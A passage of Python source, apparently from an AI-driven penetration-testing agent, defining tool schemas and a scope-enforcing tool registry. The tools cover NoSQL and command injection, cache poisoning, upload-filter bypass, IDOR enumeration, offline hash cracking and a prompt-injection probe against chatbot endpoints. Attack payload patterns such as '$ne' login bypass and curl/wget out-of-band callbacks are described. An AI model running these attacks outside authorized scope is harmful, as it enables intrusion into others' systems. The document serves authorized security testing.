                     "changes the response vs a random-param baseline is a DISCOVERY (added to the surface; a "
                     "candidate lead, not a vulnerability). Intensity widens the wordlist."),
     "input_schema": {"type": "object", "properties": {
         "url": {"type": "string", "description": "Endpoint/page to mine for hidden parameters"},
         "words": {"type": "array", "items": {"type": "string"}, "description": "Optional extra param names"}},
         "required": ["url"]}},
    {"name": "run_nosqli",
     "description": ("INTRUSIVE: NoSQL (MongoDB-style) operator-injection test on a parameterized URL. Appends an "
                     "operator suffix to the param NAME (id[$ne]=, id[$regex]=) and compares against a plain "
                     "non-matching-value control — an operator response that broadens back to baseline-shaped output "
                     "confirms the parameter reaches a NoSQL query unsanitised. Also checks for driver error "
                     "signatures (MongoDB/Mongoose/CouchDB/Redis/Elasticsearch). Read-only payloads."),
     "input_schema": {"type": "object", "properties": {
         "url": {"type": "string", "description": "URL with query parameters, e.g. https://t/item?id=1"},
         "params": {"type": "array", "items": {"type": "string"}, "description": "Params to test (default: all in the URL)"}},
         "required": ["url"]}},
    {"name": "run_llm_probe",
     "description": ("INTRUSIVE: LLM/chatbot prompt-injection probe (CWE-1427 / OWASP LLM01). Only fires against "
                     "a URL that already looks like a chat/AI endpoint (path hints: chat, assistant, copilot, "
                     "bot, llm, conversation) — never spams every endpoint. Sends a benign instruction-override "
                     "probe asking the model to emit a unique marker; CONFIRMED only on exact marker compliance. "
                     "A separate system-prompt-leak probe is heuristic-only and always reported as a lead."),
     "input_schema": {"type": "object", "properties": {
         "url": {"type": "string", "description": "Chat/AI endpoint URL, e.g. https://t/api/chat"},
         "field_candidates": {"type": "array", "items": {"type": "string"},
                              "description": "Optional JSON body field names to try (default: message/prompt/query/text/input)"}},
         "required": ["url"]}},
    {"name": "run_cache_poison",
     "description": ("INTRUSIVE: Web cache-poisoning / unkeyed-header test (X-Forwarded-Host/Scheme/Proto, "
                     "X-Host, X-Original-URL, X-Rewrite-URL). Uses its own cache-buster query param so it never "
                     "touches a real visitor's cached response. CONFIRMED only when a SUBSEQUENT unpoisoned "
                     "request to the same URL still receives the injected canary — proof the cache stored and "
                     "served poisoned content. Single-shot: stops at the first confirmed/reflected header, never "
                     "repeats poisoning against the same endpoint."),
     "input_schema": {"type": "object", "properties": {
         "url": {"type": "string", "description": "Page URL to test, e.g. https://t/"}},
         "required": ["url"]}},
    {"name": "run_upload_test",
     "description": ("INTRUSIVE: File-upload extension-filter bypass test (CWE-434). Non-destructive — every "
                     "payload is a small inert canary, never functional shell code. Sends a plainly-blocked "
                     "control (.exe) first; if rejected (proving a filter exists), tries disguised-extension "
                     "bypass filenames (double extension, case variation, semicolon) with an image magic-byte "
                     "prefix. CONFIRMED only when the control was rejected AND a bypass variant was accepted."),
     "input_schema": {"type": "object", "properties": {
         "url": {"type": "string", "description": "A page URL whose upload form will be discovered, or the form action URL"},
         "field": {"type": "string", "description": "Optional file input field name (if omitted, discovered from the page)"},
         "other_fields": {"type": "array", "items": {"type": "string"}, "description": "Optional other form field names"},
         "action": {"type": "string", "description": "Optional explicit form action URL"}},
         "required": ["url"]}},
    {"name": "run_form_nosqli",
     "description": ("INTRUSIVE: NoSQL auth-bypass on a login endpoint via the POST/JSON request BODY — the canonical "
                     "MongoDB login bypass, replacing a credential value with an operator object like {\"$ne\": null} "
                     "instead of a string. Baselines with a benign credential, injects operator objects into each "
                     "credential field, confirms a real bypass (a session/JWT token or 401->200 flip). "
                     "Non-destructive: only submits login attempts."),
     "input_schema": {"type": "object", "properties": {
         "url": {"type": "string", "description": "Login endpoint, e.g. https://t/api/login"},
         "fields": {"type": "array", "items": {"type": "string"},
                    "description": "Body field names (default: email/username + password)"}},
         "required": ["url"]}},
    {"name": "run_cmdi",
     "description": ("INTRUSIVE: OS command-injection test on a parameterized URL. Three baseline-confirmed oracles: "
                     "computed-output (echo of an arithmetic product across ; | & backtick $() separators — an echoed "
                     "payload cannot false-positive), time-based blind (sleep with a sleep-0 control), and OOB (curl/"
                     "wget to the native collaborator when BBH_OOB_BASE is set). Non-destructive payloads only."),
     "input_schema": {"type": "object", "properties": {
         "url": {"type": "string", "description": "URL with query parameters, e.g. https://t/ping?host=x"},
         "params": {"type": "array", "items": {"type": "string"}, "description": "Params to test (default: all in the URL)"},
         "delay": {"type": "integer", "default": 5, "description": "Seconds for the time-based sleep probe"}},
         "required": ["url"]}},
    {"name": "run_zap",
     "description": ("INTRUSIVE: Full OWASP ZAP DAST pass on an in-scope URL — builds a ZAP context from the mission "
                     "scope, seeds it with discovered in-scope URLs, runs the spider + AJAX spider (SPA-aware) + active "
                     "scan in-scope-only, and imports ZAP alerts as findings. Requires the optional ZAP daemon "
                     "(docker compose --profile zap up); skips cleanly if ZAP_ADDR is unset."),
     "input_schema": {"type": "object", "properties": {
         "url": {"type": "string"},
         "spider_seconds": {"type": "integer", "default": 180},
         "scan_seconds": {"type": "integer", "default": 600},
         "scan_policy": {"type": "string", "description": "Optional ZAP scan-policy name; empty uses ZAP's Default Policy"},
         "oast_service": {"type": "string", "description": "Optional OAST service for out-of-band detection: BOAST or Interactsh (needs the ZAP oast add-on)"}},
         "required": ["url"]}},
    {"name": "run_dalfox",
     "description": "INTRUSIVE: XSS scanning of a URL (requires dalfox; skips gracefully if unavailable).",
     "input_schema": {"type": "object", "properties": {"url": {"type": "string"}}, "required": ["url"]}},
    {"name": "run_sqlmap",
     "description": ("INTRUSIVE: SQL-injection confirmation on a URL (requires sqlmap; skips gracefully if "
                     "unavailable). Confirmed hits carry parsed proof (parameter, techniques, payloads, DBMS). "
                     "intensity scales depth: standard L1R1 / deep L3R2+all-techniques / insane L5R3+read-only enumeration."),
     "input_schema": {"type": "object", "properties": {
         "url": {"type": "string"}, "data": {"type": "string", "default": ""},
         "intensity": {"type": "string", "enum": ["standard", "deep", "insane"]}}, "required": ["url"]}},
    {"name": "generate_playbook",
     "description": ("PASSIVE: Run the rule-based test-guidance engine over everything discovered so far and return a "
                     "per-surface test playbook (what/how/payloads/confidence/tools/cURL/WSTG refs). Advisory only — "
                     "call this after recon to plan targeted manual testing. Does not contact the target."),
     "input_schema": {"type": "object", "properties": {}, "required": []}},
    {"name": "store_finding",
     "description": ("Store a confirmed, reproducible vulnerability for the report. Only call with real evidence and "
                     "exact reproduction steps. Do NOT store theoretical issues."),
     "input_schema": {"type": "object", "properties": {
         "title": {"type": "string"}, "severity": {"type": "string", "enum": ["critical", "high", "medium", "low", "informational"]},
         "target": {"type": "string"}, "description": {"type": "string"},
         "reproduction_steps": {"type": "array", "items": {"type": "string"}}, "impact": {"type": "string"},
         "cvss_score": {"type": "number"}, "cvss_vector": {"type": "string"}, "cwe": {"type": "string"},
         "evidence": {"type": "string"}},
         "required": ["title", "severity", "target", "description", "reproduction_steps", "impact"]}},
    # ── capability expansion (2026-07) ──
    {"name": "run_dork_gen",
     "description": ("PASSIVE: Generate operator-ready search-engine dork queries for an in-scope host "
                     "(scoped with site:). Offline — builds query TEXT only, never scrapes a search engine. "
                     "Results are advisory recon leads."),
     "input_schema": {"type": "object", "properties": {"target": {"type": "string"}}, "required": ["target"]}},
    {"name": "run_hash_id",
     "description": ("PASSIVE: Offline identification of hash types for already-obtained tokens (e.g. hashes dumped "
                     "via a confirmed SQLi). Heuristic by length/charset/prefix; returns hashcat/John modes. "
                     "No network, no target contact."),
     "input_schema": {"type": "object", "properties": {
         "hashes": {"type": "array", "items": {"type": "string"}}}, "required": ["hashes"]}},
    {"name": "run_sourcemap",
     "description": ("ACTIVE: Discover and analyse JavaScript source maps (*.js.map) for an in-scope JS bundle. "
                     "Reconstructs original source and mines hidden routes, API endpoints, feature flags, and secrets "
                     "(secrets stay leads until verified). Scope-guarded fetch."),
     "input_schema": {"type": "object", "properties": {"url": {"type": "string", "description": "URL of a JS bundle"}},
                      "required": ["url"]}},
    {"name": "run_metadata",
     "description": ("ACTIVE: Fetch an in-scope file (image/PDF/office) and extract embedded metadata (EXIF GPS, "
                     "author, software, timestamps). Uses exiftool when present, else a native pure-python reader "
                     "(graceful). Disclosed PII/location is a lead."),
     "input_schema": {"type": "object", "properties": {"url": {"type": "string"}}, "required": ["url"]}},
    {"name": "run_hash_crack",
     "description": ("INTRUSIVE (offline): Attempt an OFFLINE dictionary crack of a SUPPLIED hash against a local "
                     "wordlist using hashcat or John (whichever is installed; skips gracefully if neither). This is "
                     "offline analysis of a hash you already hold — it NEVER contacts a live authentication endpoint "
                     "and NEVER brute-forces credentials over the network."),
     "input_schema": {"type": "object", "properties": {
         "hash": {"type": "string"}, "hash_type": {"type": "string", "description": "optional; auto-identified if omitted"},
         "wordlist": {"type": "string", "description": "catalog id or absolute path; defaults to the common-passwords list"}},
         "required": ["hash"]}},
    {"name": "run_ferox",
     "description": "INTRUSIVE: Recursive content discovery via feroxbuster (optional; skips gracefully if unavailable). Native content_discovery + ffuf remain the default.",
     "input_schema": {"type": "object", "properties": {
         "url": {"type": "string"}, "wordlist": {"type": "string"}}, "required": ["url"]}},
    {"name": "run_dirsearch",
     "description": "INTRUSIVE: Content discovery via dirsearch (optional; skips gracefully if unavailable).",
     "input_schema": {"type": "object", "properties": {
         "url": {"type": "string"}, "wordlist": {"type": "string"}}, "required": ["url"]}},
    {"name": "run_gobuster",
     "description": "INTRUSIVE: Directory brute-force via gobuster (optional; skips gracefully if unavailable).",
     "input_schema": {"type": "object", "properties": {
         "url": {"type": "string"}, "wordlist": {"type": "string"}}, "required": ["url"]}},
    {"name": "run_nosqlmap",
     "description": "INTRUSIVE: NoSQL-injection testing via NoSQLMap (optional; skips gracefully if unavailable). Native run_nosqli remains the default.",
     "input_schema": {"type": "object", "properties": {"url": {"type": "string"}}, "required": ["url"]}},
    {"name": "run_dir_harvest",
     "description": ("INTRUSIVE: Find browsable file directories (ftp/uploads/backup/…) and harvest sensitive files "
                     "(confidential docs, source/DB backups, keys). On a blocked backup file, attempts a poison "
                     "null-byte extension bypass. Scope-guarded; confirmed only when content is genuinely sensitive."),
     "input_schema": {"type": "object", "properties": {"base_url": {"type": "string"}}, "required": ["base_url"]}},
    {"name": "http_read",
     "description": ("ACTIVE investigative primitive: send ONE scope-guarded read-only request (GET/HEAD/OPTIONS) with "
                     "custom headers (e.g. an Authorization token you obtained) and get the response back "
                     "(status/headers/body, secret-redacted). Use this to TEST a hypothesis: read another object's data "
                     "(IDOR/BOLA), check whether a forged token authenticates, or enumerate. Off-scope is refused."),
     "input_schema": {"type": "object", "properties": {
         "method": {"type": "string", "enum": ["GET", "HEAD", "OPTIONS"], "default": "GET"},
         "url": {"type": "string"}, "headers": {"type": "object"},
         "session": {"type": "string", "description": "name of a session from acquire_session (acts as that identity)"},
         "follow": {"type": "boolean", "default": True}}, "required": ["url"]}},
    {"name": "http_diff",
     "description": ("ACTIVE oracle primitive: send TWO scope-guarded read requests and return a DETERMINISTIC "
                     "differential (status match, length delta, body similarity, distinct_objects flag). This is how you "
                     "CONFIRM without guessing — e.g. request your own object vs another user's object and check they are "
                     "distinct 200s. Provide {a:{url,headers}, b:{url,headers}}."),
     "input_schema": {"type": "object", "properties": {
         "a": {"type": "object"}, "b": {"type": "object"}}, "required": ["a", "b"]}},
    {"name": "http_request",
     "description": ("INTRUSIVE investigative primitive: send ONE scope-guarded request with ANY method + body "
                     "(state-changing). Rides the approval gate. Use to attempt a WRITE test (add to another user's "
                     "basket, submit a forged-token action, violate a business rule). Confirm the effect with a follow-up "
                     "http_read/http_diff — never claim success from this call alone."),
     "input_schema": {"type": "object", "properties": {
         "method": {"type": "string", "default": "POST"}, "url": {"type": "string"},
         "headers": {"type": "object"}, "body": {},
         "session": {"type": "string", "description": "optional named session from acquire_session (acts as that identity)"},
         "follow": {"type": "boolean", "default": True}}, "required": ["method", "url"]}},
    {"name": "confirm_idor",
     "description": ("ACTIVE oracle for IDOR/BOLA. STRONG proof needs TWO identities: pass target_url plus "
                     "owner_session and attacker_session (from acquire_session). It confirms ONLY when the attacker "
                     "reads the SAME object the owner sees (that is real cross-user access). With one identity "
                     "(owned_url + session) it can only emit a LEAD — it cannot prove ownership from two distinct 200s. "
                     "Always prefer the two-identity form for a confirmed finding."),
     "input_schema": {"type": "object", "properties": {
         "target_url": {"type": "string", "description": "the object (owned by the victim) to test"},
         "owner_session": {"type": "string"}, "attacker_session": {"type": "string"},
         "owner_headers": {"type": "object"}, "attacker_headers": {"type": "object"},
         "owned_url": {"type": "string", "description": "single-identity fallback (lead only)"},
         "session": {"type": "string"}, "headers": {"type": "object"}},
         "required": ["target_url"]}},
    {"name": "confirm_create_object_idor",
     "description": ("INTRUSIVE (bounded + self-cleaning): CONFIRM an IDOR/BOLA by definitive ownership — "
                     "create a uniquely-owned object as the owner persona, then read (Full: also delete) it "
                     "as the attacker persona. A cross-persona hit on the marked object is a confirmed "
                     "access-control break. Needs two acquired sessions (owner + attacker)."),
     "input_schema": {"type": "object", "properties": {
         "base_url": {"type": "string"}, "owner": {"type": "string"}, "attacker": {"type": "string"},
         "app": {"type": "string"}, "specs": {"type": "array", "items": {"type": "object"}}},
         "required": ["base_url", "owner", "attacker"]}},
    {"name": "enumerate_ids",
     "description": ("INTRUSIVE: bounded object-id enumeration on a templated URL (contains {id}). Give a numeric "
                     "start/end (hard-capped at 50) and optional session; returns which ids are distinct "
                     "populated 200s vs a nonexistent-id baseline. Emits a lead — confirm ownership with confirm_idor."),
     "input_schema": {"type": "object", "properties": {
         "url_template": {"type": "string"}, "start": {"type": "integer", "default": 1},
         "end": {"type": "integer"}, "headers": {"type": "object"},
         "session": {"type": "string", "description": "name of a session from acquire_session"}}, "required": ["url_template"]}},
    {"name": "acquire_session",
     "description": ("ACTIVE: log in ONCE with a supplied credential (JSON API or form) and store the session under a "
                     "role name for reuse — then pass session=\"<role>\" to http_read/http_diff/confirm_idor/"
                     "enumerate_ids to act as that identity. Acquire two roles (e.g. victim + attacker) to test "
                     "cross-user access. This is authorized single-credential authentication, hard-capped — it NEVER "
                     "iterates a password list. The token is stored server-side and never shown."),
     "input_schema": {"type": "object", "properties": {
         "login_url": {"type": "string"}, "username": {"type": "string"}, "email": {"type": "string"},
         "password": {"type": "string"}, "role": {"type": "string", "default": "default"}},
         "required": ["login_url", "password"]}},
    {"name": "browser_navigate",
     "description": ("ACTIVE: drive a real headless browser through a DECLARATIVE step list and capture the client-side "
                     "state a DevTools session would show. Use for authenticated single-page-app flows (log in via the "
                     "UI, then act) and to inspect what pure HTTP can't: localStorage/sessionStorage (tokens, feature "
                     "flags), the XHR/fetch API calls the app makes (seeds the surface), loaded scripts, and DOM text. "
                     "steps is a list of {action: goto|click|fill|press|wait, url?, selector?, value?, key?, ms?}. No "
                     "arbitrary JavaScript. Every navigation is scope-checked; secret storage values are redacted."),
     "input_schema": {"type": "object", "properties": {
         "url": {"type": "string", "description": "starting URL"},
         "steps": {"type": "array", "items": {"type": "object", "properties": {
             "action": {"type": "string", "enum": ["goto", "click", "fill", "press", "wait"]},
             "url": {"type": "string"}, "selector": {"type": "string"},
             "value": {"type": "string"}, "key": {"type": "string"}, "ms": {"type": "integer"}}}},
         "session": {"type": "string", "description": "optional named session from acquire_session"},
         "promote_session": {"type": "string", "description": "after the flow, save the browser's auth (JWT/cookie) as this named session"}},
         "required": ["url"]}},
    {"name": "test_numeric_abuse",
     "description": ("INTRUSIVE business-logic probe: send a numeric field (quantity/price/amount/limit) a benign "
                     "control plus out-of-range values (negative/zero/huge/fractional) to a state-changing request and "
                     "report which the server ACCEPTS but should reject. Never finalizes a payment or irreversible "
                     "action. Emits a lead — verify the downstream effect (e.g. a negative total) with http_read."),
     "input_schema": {"type": "object", "properties": {
         "url": {"type": "string"}, "method": {"type": "string", "default": "POST"},
         "param": {"type": "string", "description": "numeric field name; dot-path for nested (e.g. data.quantity)"},
         "body": {"type": "object"}, "control": {}, "values": {"type": "array"},
         "session": {"type": "string"}, "headers": {"type": "object"}}, "required": ["url", "param"]}},
    {"name": "mission_state",
     "description": ("PASSIVE: read the current investigation state — acquired identities, confirmed CAPABILITIES "
                     "(database_read, foreign_object_read, admin_session, password_hash_obtained, …), objects seen, "
                     "extracted variables, and chaining hints. Use it to plan the next step and chain capabilities."),
     "input_schema": {"type": "object", "properties": {}, "required": []}},
    {"name": "mission_intel",
     "description": ("PASSIVE: read the Target Intelligence harvested from the target's own surface so far — "
                     "candidates it leaked (emails, usernames, object-ids, routes, external URLs, decoded blobs, "
                     "hints). Consume these as FIXTURES (a user-id to enumerate, a hidden route to hit, a decoded "
                     "hint) instead of guessing — the general OSINT/source-review loop. Secrets are redacted."),
     "input_schema": {"type": "object", "properties": {}, "required": []}},
    {"name": "run_workflow",
     "description": ("INTRUSIVE: execute a declarative technique-pack workflow. workflow = {id, requires:[capability:X], "
                     "inputs:{var:val}, steps:[{do:http_read|http_request|confirm_idor|enumerate_ids|acquire_session|"
                     "browser_navigate|test_numeric_abuse, as:<session>, extract:{var:'$.json.path' | {regex:'..'} | "
                     "{header:'..'}}, ...}], assert:{field:confirmed,equals:true}|{capability:X}, produces:[capability:X]}. "
                     "Variables {var} substitute into later steps. Reusable across targets — values come from inputs, not "
                     "hardcoding. Confirmed findings come from confirm_* steps."),
     "input_schema": {"type": "object", "properties": {"workflow": {"type": "object"},
         "pack": {"type": "string", "description": "id of a built-in pack (see list_workflows)"},
         "inputs": {"type": "object", "description": "input values for the pack"}}}},
    {"name": "list_workflows",
     "description": ("PASSIVE: list the built-in reusable technique packs (idor_read, bfla_privileged_action, "
                     "price_quantity_tamper, object_id_sweep, …) and the inputs each needs. Run one with "
                     "run_workflow{pack, inputs}."),
     "input_schema": {"type": "object", "properties": {}, "required": []}},
    {"name": "benchmark_lab",
     "description": ("ACTIVE (lab benchmark only): score coverage against a known lab's completion oracle "
                     "(juiceshop/dvwa), auto-detecting the lab from the page. Separate from detection — measurement "
                     "only, never hardcoded into scanners."),
     "input_schema": {"type": "object", "properties": {
         "base_url": {"type": "string"}, "lab": {"type": "string"}}, "required": ["base_url"]}},
]


def _valid_jwt(tok: str) -> bool:
    """True if tok is a structurally-valid, decodable JWT (eyJ header.payload.sig with a non-empty
    JSON payload) — so a browser login promotes a REAL token, not any random storage value."""
    import base64
    parts = (tok or "").split(".")
    if len(parts) != 3 or not tok.startswith("eyJ"):
        return False
    try:
        pad = parts[1] + "=" * (-len(parts[1]) % 4)
        payload = json.loads(base64.urlsafe_b64decode(pad.encode()).decode("utf-8", "replace"))
        return isinstance(payload, dict) and bool(payload)
    except Exception:
        return False


def _pick_session_token(storage_values, xhr_auth):
    """Pick the best auth token for a browser-promoted session: a Bearer token OBSERVED on a real
    XHR/fetch wins (it is what the app actually sends), else a structurally-valid JWT from web
    storage. Returns None if neither yields a valid token (CHAD review #4 — not just first-JWT)."""
    for a in (xhr_auth or []):
        t = a[7:].strip() if str(a).lower().startswith("bearer ") else str(a).strip()
        if _valid_jwt(t):
            return t
    for v in (storage_values or []):
        if _valid_jwt(str(v)):
            return str(v)
    return None


class ToolRegistry:
    def __init__(self, scope: ScopeEngine, mission_id: str = None, lab_mode: bool = False,
                 session_headers: dict = None, intensity: str = "standard"):
        self.scope = scope
        self.mission_id = mission_id
        self.lab_mode = lab_mode
        # Intensity dial (orthogonal to mode's permission gate): how HARD each heavy
        # tool hits an in-scope target. standard = today's light/fast flags (default,
        # no regression); deep = thorough; insane = maximum coverage (hours OK).
        # Truth-first is unchanged — heavier flags surface more candidates, but the
        # confirmation logic is identical, so leads stay leads.
        self.intensity = (intensity or "standard").lower()
        # Authenticated scanning: headers (Cookie/Authorization) shared with every
        # HTTP request the tools make, so scans reach the post-login surface.
        self.session_headers = session_headers or {}
        # Mission request budget — off by default (limit 0 = unlimited); set BBH_REQUEST_BUDGET to
        # cap how many HTTP requests one mission may make, so a runaway scan can't hammer a target.
        import budget as _budget
        self.budget = _budget.MissionBudget(int(os.environ.get("BBH_REQUEST_BUDGET", "0") or 0))
        # Named sessions acquired at runtime by the investigative loop (role -> auth
        # headers). The raw token is stored here and injected server-side; it is NEVER
        # returned to the model. _login_attempts caps acquire_session to preserve the
        # never-brute-force-credentials guarantee.
        self._sessions = {}
        self._login_attempts = 0
        # capability-based investigation state (identities, ownership, capabilities, vars)
        import investigation as _inv
        self.state = _inv.InvestigationState()
        self._Capability = _inv.Capability
        # Target-intelligence store: every scoped fetch harvests candidates (emails, users,
        # object-ids, routes, external URLs, encoded blobs, hints) into here so exploitation
        # techniques can consume them as run-time FIXTURES (fixture_source=harvest). Secrets
        # are redacted when this is serialized for the model / report / disk.
        import intel as _intel
        self.intel = _intel.IntelStore()
        self._intel_mod = _intel
        # Traffic capture: a unified Burp/ZAP-style ledger of every request/response (HTTP + browser),
        # persisted at finalize and exportable as HAR. Bounded + secret-redacted.
        import capture as _capture
        self.capture = _capture.CaptureStore()
        # set by the agent so long ZAP polls can honor a user stop
        self.stop_event = None
        # Shared recon accumulator consumed by guidance + surface.
        dom = ""
        if scope.in_scope:
            dom = scope.in_scope[0].value.lstrip("*.")
        self.recon: dict = {
            "target": dom, "domain": dom, "subdomains": [], "live_hosts": [],
            "nuclei": [], "dir_bust": {}, "misc": [], "takeover_candidates": [],
            "http": {}, "nmap": {"open_ports": []},
        }
        self.urls: list = []
        # LIVE canonical asset/intelligence graph — grown as observations arrive (see _graph_add_url),
        # so the planner reads a current world model instead of a graph rebuilt only at finalize.
        import asset_graph as _asset_graph
        self.graph = _asset_graph.AssetGraph(mission_id or "default")

    # ── tool schema exposure ─────────────────────────────────────
    def get_claude_tools(self) -> list:
        return CLAUDE_TOOLS

    def get_openai_tools(self) -> list:
        return [{"type": "function", "function": {
            "name": t["name"], "description": t["description"], "parameters": t["input_schema"]}}
            for t in CLAUDE_TOOLS]

    # ── dispatch with scope enforcement ──────────────────────────
    async def execute(self, tool_name: str, tool_input: dict, session_id: str) -> ToolResult:
        if tool_name == "store_finding":
            return await self._store_finding(tool_input)
        if tool_name == "generate_playbook":
            return await self._generate_playbook(tool_input)

        single = tool_input.get("domain") or tool_input.get("target") or tool_input.get("url") or tool_input.get("base_url")
        if single:
            check = single.split("FUZZ")[0] if "FUZZ" in single else single
            allowed, reason = self.scope.validate(check)
            if not allowed:
                return ToolResult(tool_name, single, False, "", [], f"SCOPE BLOCK: {reason}")

        if "targets" in tool_input:
            filtered = [t for t in tool_input["targets"] if self.scope.validate(t)[0]]
            if not filtered:
                return ToolResult(tool_name, "", False, "", [], "SCOPE BLOCK: No in-scope targets in list")
            tool_input = {**tool_input, "targets": filtered}

        method = getattr(self, f"_{tool_name}", None)
        if not method:
            return ToolResult(tool_name, "", False, "", [], f"Unknown tool: {tool_name}")
        return await method(tool_input)

    # external security tools make many requests internally; charge them against the mission budget
    # by a per-tool weight so the budget is MISSION-WIDE (not just Apolaki's own HTTP transport).
    _TOOL_WEIGHT = {"nuclei": 100, "ffuf": 100, "sqlmap": 100, "katana": 50, "nmap": 50, "dalfox": 50,
                    "dirb": 50, "subfinder": 30, "httpx": 30, "whatweb": 10, "nikto": 100, "wpscan": 100}

    # ── helpers ──────────────────────────────────────────────────
    async def _cmd(self, cmd: list, timeout: int = 180) -> tuple:
        if not shutil.which(cmd[0]):
            return "", f"__MISSING__{cmd[0]}"
        weight = self._TOOL_WEIGHT.get(os.path.basename(str(cmd[0])), 25)
        if not self.budget.charge(weight):
            return "", (f"__BUDGET__ mission request budget exhausted "
                        f"(external tool '{os.path.basename(str(cmd[0]))}' costs {weight})")
        try:
            proc = await asyncio.create_subprocess_exec(
                *cmd, stdout=asyncio.subprocess.PIPE, stderr=asyncio.subprocess.PIPE)
            out, err = await asyncio.wait_for(proc.communicate(), timeout=timeout)
            return out.decode(errors="replace"), err.decode(errors="replace")
        except asyncio.TimeoutError:
            return "", "Command timed out"
        except Exception as e:
            return "", str(e)

    # ── capability-expansion tools (2026-07) ─────────────────────
    async def _run_dork_gen(self, inp: dict) -> ToolResult:
        """PASSIVE, offline: build operator-ready search-dork queries. No network."""
        import dorks
        target = (inp.get("target") or "").strip()
        d = dorks.generate(target)
        if not d["groups"]:
            return ToolResult("dork_gen", target, False, "No valid host for dork generation", [])
        # advisory recon lead carrying the ready-to-run queries (never a confirmed finding)
        lead = {"title": f"Passive search-operator (dork) queries for {d['target']}",
                "severity": "info", "family": "recon", "confidence": "lead",
                "target": d["target"], "tags": ["osint", "dork", "passive"],
                "description": "Operator-ready search queries (scoped with site:). Paste manually; not auto-scraped.",
                "evidence": dorks.as_markdown(target)}
        return ToolResult("dork_gen", d["target"], True,
                          f"{len(d['flat'])} dork queries generated (offline)", [lead])

    async def _run_hash_id(self, inp: dict) -> ToolResult:
        """PASSIVE, offline: identify hash types for already-obtained tokens."""
        import hashid_tool as hid
        hashes = [h for h in (inp.get("hashes") or []) if isinstance(h, str)][:50]
        ided = [{"hash": (h[:12] + "…") if len(h) > 12 else h, "candidates": hid.identify(h)}
                for h in hashes if hid.identify(h)]
        if not ided:
            return ToolResult("hash_id", "", True, "No recognizable hashes", [])
        lines = [f"- `{r['hash']}` → " + ", ".join(c["name"] for c in r["candidates"][:3]) for r in ided]
        lead = {"title": f"Hash identification ({len(ided)} token(s))", "severity": "info",
                "family": "crypto", "confidence": "lead", "tags": ["hash", "offline"],
                "description": "Offline hash-type identification of already-obtained tokens.",
                "evidence": "\n".join(lines)}
        return ToolResult("hash_id", "", True, f"{len(ided)} hash(es) identified", [lead])

    async def _run_sourcemap(self, inp: dict) -> ToolResult:
        """ACTIVE: fetch + analyse a JS bundle's source map for hidden routes/APIs/secrets."""
        import httpx
        import sourcemap_tool as sm
        url = (inp.get("url") or "").strip()
        if not self.scope.validate(url)[0]:
            return ToolResult("sourcemap", url, False, "Off-scope", [])
        headers = {"User-Agent": _UA, **(self.session_headers or {})}
        findings, analysed = [], None
        async with httpx.AsyncClient(verify=False, follow_redirects=True, headers=headers, timeout=25) as c:
            body = ""
            if not url.endswith(".map"):
                try:
                    body = (await c.get(url)).text
                except Exception:
                    body = ""
            for map_url in ([url] if url.endswith(".map") else sm.candidate_map_urls(url, body)):
                if not self.scope.validate(map_url)[0]:
                    continue
                try:
                    r = await c.get(map_url)
                except Exception:
                    continue
                if r.status_code != 200:
                    continue
                parsed = sm.parse(r.text)
                if not parsed["sources"] and not parsed["content"]:
                    continue
                analysed = sm.analyze(parsed)
                # seed discovered endpoints into the surface (each re-validated by _add_urls)
                base = re.match(r"(https?://[^/]+)", url)
                if base and analysed["endpoints"]:
                    self._add_urls([base.group(1) + e for e in analysed["endpoints"] if e.startswith("/")])
                # secrets/routes/flags are LEADS (truth-first) until a human verifies them
                ev = ("Source map: %s\nHidden sources: %d\nRoutes: %s\nFeature flags: %s\nEndpoints: %d"
                      % (map_url, len(analysed["sources"]), ", ".join(analysed["routes"][:15]) or "-",
                         ", ".join(analysed["feature_flags"][:10]) or "-", len(analysed["endpoints"])))
                findings.append({"title": f"Source map exposed ({map_url.rsplit('/', 1)[-1]})",
                                 "severity": "low", "family": "exposure", "confidence": "lead",
                                 "target": map_url, "tags": ["source-map", "info-disclosure"],
                                 "description": ("A JavaScript source map exposes original source, revealing internal "
                                                 "routes, API endpoints, feature flags and possible secrets."),
                                 "evidence": ev})
                for s in analysed["secrets"]:
                    s = dict(s); s["confidence"] = "lead"; s["target"] = map_url
                    findings.append(s)
                break
        if not analysed:
            return ToolResult("sourcemap", url, True, "No source map found", [])
        return ToolResult("sourcemap", url, True,
                          f"source map analysed: {len(analysed['routes'])} routes, "
                          f"{len(analysed['endpoints'])} endpoints, {len(analysed['secrets'])} secret lead(s)",
                          findings)

    async def _run_metadata(self, inp: dict) -> ToolResult:
        """ACTIVE: fetch an in-scope file and extract embedded metadata (exiftool or native)."""
        import httpx
        import tempfile
        import upload_tool  # native metadata fallback lives here
        url = (inp.get("url") or "").strip()
        if not self.scope.validate(url)[0]:
            return ToolResult("metadata", url, False, "Off-scope", [])
        headers = {"User-Agent": _UA, **(self.session_headers or {})}
        try:
            async with httpx.AsyncClient(verify=False, follow_redirects=True, headers=headers, timeout=25) as c:
                r = await c.get(url)
                data = r.content[:8_000_000]
        except Exception as e:
            return ToolResult("metadata", url, False, f"fetch failed: {e}", [])
        meta, tool_used = {}, "native"
        if shutil.which("exiftool"):
            with tempfile.NamedTemporaryFile(delete=False, suffix=os.path.splitext(url.split("?")[0])[-1]) as tf:
                tf.write(data); tmp = tf.name
            out, _ = await self._cmd(["exiftool", "-j", "-n", tmp], timeout=30)
            try:
                os.unlink(tmp)
            except OSError:
                pass
            try:
                arr = json.loads(out or "[]")
                meta = arr[0] if arr else {}
                tool_used = "exiftool"
            except Exception:
                meta = {}
        if not meta:
            meta = upload_tool.extract_metadata(data)  # native XMP/PDF/EXIF-ASCII fallback
        interesting = {k: v for k, v in (meta or {}).items()
                       if any(h in k.lower() for h in ("gps", "location", "author", "creator", "artist",
                                                       "owner", "software", "make", "model", "email", "coord"))}
        if not interesting:
            return ToolResult("metadata", url, True, f"No sensitive metadata ({tool_used})", [])
        ev = "\n".join(f"{k}: {v}" for k, v in list(interesting.items())[:25])
        sev = "medium" if any("gps" in k.lower() or "location" in k.lower() or "coord" in k.lower()
                              for k in interesting) else "low"
        lead = {"title": "Sensitive metadata in served file", "severity": sev, "family": "exposure",
                "confidence": "lead", "target": url, "tags": ["metadata", "info-disclosure", tool_used],
                "description": ("A downloadable file embeds metadata (GPS location, author, device, or software), "
                                "which can deanonymize users or leak internal details."),
                "evidence": ev}
        return ToolResult("metadata", url, True, f"metadata extracted ({tool_used})", [lead])

    async def _run_hash_crack(self, inp: dict) -> ToolResult:
        """INTRUSIVE (offline): dictionary-crack a SUPPLIED hash with hashcat/John against a
        LOCAL wordlist. Offline analysis of a hash already held — never contacts a live auth
        endpoint, never brute-forces credentials over the network."""
        import tempfile
        import wordlists as wl
